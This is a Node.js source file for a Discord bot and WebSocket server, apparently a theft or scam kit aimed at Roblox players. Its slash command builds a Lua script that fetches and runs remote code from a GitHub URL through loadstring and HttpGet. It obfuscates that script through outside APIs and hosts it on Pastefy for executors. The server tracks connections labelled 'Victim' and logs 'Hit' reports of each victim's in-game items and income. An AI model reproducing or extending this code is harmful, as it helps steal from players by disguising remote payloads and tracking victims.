const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const luamin = require('luamin');
const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
const { v4: uuidv4 } = require('uuid');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags } = require('discord.js');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const axios = require('axios');
const { PastefyClient } = require('@interaapps/pastefy');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
const generateWebhookId = () => { return `wh_${randomBytes(8).toString('hex')}`; };
const pastefy = new PastefyClient(process.env.PASTEFY_KEY);

async function uploadToPastefy(code, webhookId) {
    try {
        log("☁️ [PASTEFY] Creating paste via Official SDK...");

        // Utilisation simplifiée du SDK
        const paste = await pastefy.createPaste({
            title: `SABTrade`,
            content: code,
            visibility: 'PUBLIC' // Utilise 'UNLISTED' ou 'PUBLIC' selon tes besoins
        });

        if (paste && paste.id) {
            const rawUrl = `https://pastefy.app/${paste.id}/raw`;
            log(`✅ [PASTEFY] Success! ID: ${paste.id}`);
            return rawUrl;
        }
        
        return null;
    } catch (error) {
        log(`❌ [PASTEFY ERROR] ${error.message}`);
        return null;
    }
}

async function obfuscateScript(luaCode) {
    try {
        log("🔍 [OBF] Requesting WeAreDevs Obfuscator...");

        const response = await axios.post('https://wearedevs.net/api/obfuscate', 
        {
            script: luaCode
        }, 
        {
            headers: {
                'accept': 'application/json',
                'content-type': 'application/json',
                'cookie': process.env.WRD_COOKIE, // Ta variable sur Render
                'Referer': 'https://wearedevs.net/obfuscator',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
            }
        });

        // On vérifie le succès selon le format que tu as reçu
        if (response.data && response.data.success) {
            log("✅ [OBF] WeAreDevs Success!");
            return response.data.obfuscated; // C'est ici que se trouve le code
        }

        log("⚠️ [OBF] Failed: " + (response.data.message || "Unknown error"));
        return null;

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.message}`);
        return null;
    }
}
async function obfuscateScriptv2(luaCode) {
    try {
        log("🔍 [OBF] Step 1: Creating Session...");

        // ÉTAPE 1 : Créer la session avec le code source
        const sessionResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/newscript', 
            luaCode, // Le code est envoyé directement comme texte
            {
                headers: {
                    'apikey': process.env.LUA_OBF_KEY,
                    'content-type': 'text/plain' // La doc dit 'text'
                }
            }
        );

        const sessionId = sessionResponse.data.sessionId;
        if (!sessionId) throw new Error("No Session ID returned");

        log(`🔍 [OBF] Step 2: Applying Obfuscation (Session: ${sessionId.substring(0, 8)}...)`);

        // ÉTAPE 2 : Appliquer les plugins d'obfuscation
        const obfResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/obfuscate', 
            {
                "MinifiyAll": true,
                "CustomPlugins": {
                    "EncryptStrings": [100],      // 100% des strings chiffrées
                    "ControlFlowFlattenV1AllBlocks": [100], // Flux mélangé
                    "SwizzleLookups": [100]        // foo.bar -> foo['bar']
                }
            }, 
            {
                headers: {
                    'apikey': process.env.LUA_OBF_KEY,
                    'sessionId': sessionId,
                    'content-type': 'application/json'
                }
            }
        );

        if (obfResponse.data && obfResponse.data.code) {
            log(`✅ [OBF] Success! Final code received.`);
            return obfResponse.data.code;
        }

        return null;

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.response?.data?.message || error.message}`);
        return null;
    }
}

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
  .then(() => {
      log("✅ [DB] Connexion établie");
  })
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const WebHookIdSchema = new mongoose.Schema({
    webhookId: {
        type: String,
        unique: true
    },
    url: {
        type: String,
        required: true,
        trim: true
    },
    ownerName: {
        type: String,
        required: true,
        trim: true
    }
}, {
    timestamps: true
});

const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);

const activeVictims = new Map();
const activeBots = new Map();
const activeAdmins = new Set();


// --- BOT DISCORD ---
const clientDiscord = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

const commands = [
    new SlashCommandBuilder()
        .setName('generate-sab-trade')
        .setDescription('Generate a SAB Trade script')
        .addStringOption(option =>
            option.setName('username')
                .setDescription('List of Roblox usernames separated by commas')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Discord Webhook URL')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('income')
                .setDescription('Minimum income threshold (e.g. 10000000)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('visual')
                .setDescription('URL for the visual interface (Optional)')
                .setRequired(false)) // Paramètre optionnel
].map(cmd => cmd.toJSON());

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
    try {
        log('🔄 Refresh des commandes slash...');
        await rest.put(
            Routes.applicationCommands(clientDiscord.user.id),
            { body: commands }
        );
        log('✅ Commandes slash enregistrées');
    } catch (error) {
        log(`❌ Erreur Slash Commands: ${error}`);
    }
});

clientDiscord.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'generate-sab-trade') {
        // 1. On prévient Discord qu'on travaille (indispensable pour les traitements longs)
        try {
            await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
        } catch (err) {
            console.error("❌ Erreur deferReply:", err);
            return;
        }

        try {
            const usernames = interaction.options.getString('username');
            const webhookUrl = interaction.options.getString('webhook');
            const income = interaction.options.getInteger('income');
            const visual = interaction.options.getString('visual') || "";
            
            // Génération de l'ID unique
            const webhookUuid = generateWebhookId();

            // 2. Sauvegarde en Base de données (MongoDB)
            const newWebhookEntry = new WebHookId({
                webhookId: webhookUuid,
                url: webhookUrl,
                ownerName: interaction.user.tag
            });
            await newWebhookEntry.save();
            log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.tag}`);

            // 3. Préparation du Code Source Lua
            const userArrayLua = usernames.split(',').map(u => `"${u.trim()}"`).join(', ');
            const codeToObfuscate = `local fenv = getfenv()
fenv["Receivers"] = { ${userArrayLua} }
fenv["WebHook"] = "${webhookUuid}"
fenv["Visual"] = "${visual}"
fenv["MinIncome"] = ${income}
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde"))()`;

            // 4. Obfuscation via LuaObfuscator API
            const obfuscated = await obfuscateScript(codeToObfuscate);

            if (!obfuscated) {
                return await interaction.editReply("❌ Obfuscation failed. Please check server logs.");
            }

            // 5. Upload sur Pastefy
            const pasteUrl = await uploadToPastefy(obfuscated, webhookUuid);

            if (!pasteUrl) {
                return await interaction.editReply("⚠️ Obfuscation success, but Pastefy upload failed.");
            }

            // 6. Réponse finale avec Embed professionnel
            const successEmbed = new EmbedBuilder()
                .setTitle("🛡️ Script Protected & Uploaded")
                .setColor(0x00FF00)
                .addFields(
                    { name: "🆔 Webhook ID", value: `\`${webhookUuid}\``, inline: true },
                    { name: "🔗 Raw Link", value: `[Click to Copy](${pasteUrl})`, inline: true }
                )
                .setDescription("### 📋 Instructions\nCopy the link above and use it in your loader or executor.\n\n*Your script is now obfuscated and hosted safely.*")
                .setFooter({ text: `Generated for ${interaction.user.tag}` })
                .setTimestamp();

            await interaction.editReply({ embeds: [successEmbed] });

        } catch (error) {
            log(`❌ [ERROR] ${error.message}`);
            // Si on a déjà fait le deferReply, on utilise editReply pour l'erreur
            if (interaction.deferred) {
                await interaction.editReply(`❌ An error occurred: ${error.message}`).catch(() => null);
            }
        }
    }
});

if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

// --- GESTION WEBSOCKET ---
wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url, true).query);
    const username = params.get('username') || "Unknown";
    const usertype = params.get('usertype') || "Unknown";
  
    if (usertype === "Admin") {
        activeAdmins.add(ws);
        log("👨‍💻 Un administrateur s'est connecté");

        ws.on('close', () => {
            activeAdmins.delete(ws);
            log("👨‍💻 Un administrateur s'est déconnecté");
        });
        return; // On s'arrête ici pour les admins
    }
  
    if (usertype === "Bot") {
        if (activeBots.has(username)) {
            log(`Bot ${username} déjà présent, remplacement...`);
            activeBots.get(username).terminate();
        }
    
        activeBots.set(username, ws);
        log(`🤖 Bot connecté : ${username}`);

        ws.on('close', () => {
            if (activeBots.get(username) === ws) {
                activeBots.delete(username);
                log(`💀 Bot déconnecté : ${username}`);
            }
        });
        return; // On s'arrête ici pour les bots
    }
  
    if (usertype === "Victim") {
        if (activeVictims.has(username)) {
            log(`Victim ${username} déjà présent, remplacement...`);
            activeVictims.get(username).terminate();
        }
    
        activeVictims.set(username, ws);
        log(`🤖 Victim connecté : ${username}`);

        ws.on('close', () => {
            if (activeVictims.get(username) === ws) {
                activeVictims.delete(username);
                log(`💀 Victim déconnecté : ${username}`);
            }
        });
      
        ws.on('message', async (msg) => {
          try {
              const data = JSON.parse(msg);
              if (data.Method === "Hit") {
                log(`🎯 Hit reçu de : ${data.Hit.Name}`);
                  
                if (data.Hit.Brainrots && data.Hit.Brainrots.length > 0) {
                  data.Hit.Brainrots.forEach((br, index) => {
                    log(`   [${index + 1}] Brainrot: ${br.Name} | Income: ${br.IncomeStr}`);
                  });
                } else {
                  log(`   ⚠️ Aucun Brainrot trouvé sur le plot.`);
                }
            }
          } catch (e) { log(`⚠️ Erreur Message WS: ${e.message}`); }
      });
      return; // On s'arrête ici pour les Victims
    }
    
});

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
